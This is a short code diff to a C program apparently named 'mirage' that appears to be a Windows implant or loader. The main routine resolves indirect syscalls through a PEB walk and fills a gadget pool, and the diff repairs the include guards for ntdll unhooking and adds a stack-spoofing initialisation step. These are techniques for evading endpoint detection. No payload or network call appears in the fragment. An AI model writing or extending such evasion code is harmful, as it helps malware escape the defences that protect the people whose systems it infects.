@@ -72,11 +72,10 @@ extern int mirage_collect_system_info(char *output, size_t outlen);
 #include "mutex.h"
 #endif
 #ifdef ENABLE_UNHOOK_NTDLL
+#include "unhook.h"
+#endif
 #ifdef ENABLE_STACK_SPOOF
 #include "stack_spoof.h"
-#endif
-
-#include "unhook.h"
 #endif
 
 /* ── Cleanup ──────────────────────────────────────────────────── */
@@ -500,6 +499,11 @@ int main(int argc, char *argv[]) {
     if (ok) {
         dbg_printf("[+] Syscalls resolved (indirect)\n");
         mirage_init_gadget_pool();
+#ifdef ENABLE_STACK_SPOOF
+        spoof_init();
+        dbg_printf("[+] Stack spoofing ready\n");
+#endif
+
         dbg_printf("[+] Gadget pool filled\n");
     } else {
         dbg_printf("[!] PEB walk failed — using fallback WinAPI\n");
